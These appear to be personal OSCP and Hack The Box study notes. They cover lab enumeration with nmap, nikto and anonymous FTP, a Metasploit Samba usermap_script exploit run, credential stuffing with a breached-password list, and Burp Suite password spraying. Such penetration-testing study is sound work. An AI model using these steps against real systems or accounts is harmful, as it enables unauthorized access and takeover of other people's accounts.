#FROM EXPERIENCE WHENEVER YOU ARE RUNNING OSCP, whenever you find port 80 opened, you will
#likely find credentials that will lead you to port 22 and allows you to get to a shell
#or gets an exploit on 80 that will get you to a remote code execution, get credentials
#ssh over and find root
#makes a finding on apache server header, eventhough it is saying the page is moved, it is still a finding
#chcek out the website on a browser by running the ip- 10.10.10.133
#you can view the page source

#we can run a nikto on the host for onetwoseven
#run
nikto -h onetwoseven.htb
#we can run a dirbuster too
#run the sftp for the hostname that you saw
sftp onetwoseven.htb
#add the username to it, it will prompt you for the password.
sftp ##### onetwoseven.htb

#Enumerating a machine
#running nmap command to enumerate a machine
#first thing i will enumerate is the ftp server- look for it, if it is available.
#then ssh- try to do a brute force on this if it is open
#for ports 139 and 445 for smb, just focus on what the version is.can we connect to it anonymously
#so open a new tab to start the enumeration from ftp- click on File and select 'new tab"
#run the command 
ftp 10.10.10.3
#if it asks for name or username and password, type "anonymous"
anonymous
anonymous

#google the versions of vulnerabilities that you find, to see if you can find anything of note. (with exploit added to the vulnerability
#open up a metasploit
msfconsole
search username map
use exploit/multi/samba/usermap script
options
set rhosts 10.10.10.3
run
#once it is completed and you don't get anything, you can run it again until perhaps get a shell( i.e the run command)
#run whoami and see if it will give you root, then hostname

#credential stuffing
#password spraying

#credential stuffing
injecting breached account credentials in hopes of account takeover
e.g having a compromised server that has users credentials
#take the passwords from it and try them in website logins owned by the client
#there is a "breach parse" in github that you can use or run
#tjis script searches through 1.4billion+ password list
https://github.com/hmaverickadams/breach-parse

#what does the information reveal?
usernames/passwords
username patterns
password patterns
#find a hash for a password that has not been cracked yet
#that it is crackabke, does not mean it can be cracked.

#use burp suite
go to the burger-like icon on your browser
right click on it and select "preferences"
go to "network" setting at the bottom
select "proxy"
select "manual proxy configuration"
enter the http proxy-ip and port e.g 8080
enter the ip for the targeted host in another browser and see if you could access
refresh
go back to burp suite and click on "intercept is on" button, if it produces output, it means it is scanning the host
click on "payloads" button and let it be at set 1 for email addresses of users
payload set 2, should have the passwords of users
click on "start attack" button at the top right hand corner
click on "OK"
If you are seeing differences in values in the "length" column. That means something is different.
you can highlight the one with major difference changes and click on "render" button below to see what happens
if you try login into the website and you get a warning that reflects that the username is correct, but not the password
you should do "PASSWORD SPRAYING" next

#Password spraying
#threat actor using a single common password against multiple accounts on the same application
you change something in the text with a particular password
you go to payload and do set 1 that has all the emails
click on "start attack"
click on "OK"
it will set the password that was changed to all the emails in the payload in set 1 and see if something breaks
this is the strategy used to get into a VPN.
